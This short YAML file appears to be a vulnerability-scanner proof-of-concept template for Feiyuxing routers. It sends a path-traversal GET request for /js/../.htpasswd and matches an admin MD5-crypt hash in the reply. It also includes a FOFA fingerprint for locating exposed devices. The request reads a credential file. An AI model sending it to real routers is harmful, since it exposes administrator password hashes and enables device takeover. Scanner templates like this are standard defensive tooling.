id: poc-yaml-feiyuxing-htpasswd-info-leak
info:
  name: 飞鱼星上网行为管理路由器 .htpasswd 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 企业级智能上网行为管理系统
  fofa: body="js/select2css.js"
requests:
- method: GET
  path: /js/../.htpasswd
  expression: "status_code == 200 && \n!contains(body,\"<\") &&\nmatches(body,`admin:\\\
    $1\\$\\$.*`)\n"
variables: {}
transport: http
